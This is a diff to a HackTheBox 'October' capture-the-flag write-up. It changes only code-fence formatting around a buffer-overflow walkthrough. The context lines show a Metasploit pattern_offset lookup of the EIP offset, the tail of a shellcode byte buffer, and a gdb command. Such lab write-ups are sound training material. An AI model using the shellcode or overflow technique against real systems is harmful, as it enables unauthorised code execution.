@@ -647,7 +647,8 @@ Do you want to kill the process? (Y/n) y
 ```
 
 We find the hex bytes 0x64413764 in the eip register and we use this value to look up the offset
-                                                                                                                                
+
+```                                                                                                                                
 ┌──(user㉿kali)-[~/hackthebox/hackthebox/october/ovrflw]
 └─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x64413764
 [*] Exact match at offset 112
@@ -673,6 +674,7 @@ buf += b"\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb2\x6a\xb0\x03\xcd"
 buf += b"\x80\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb"
 buf += b"\x01\x00\x00\x00\xcd\x80"
 ```
+
 ```
 
 $ gdb /usr/local/bin/ovrflw -q
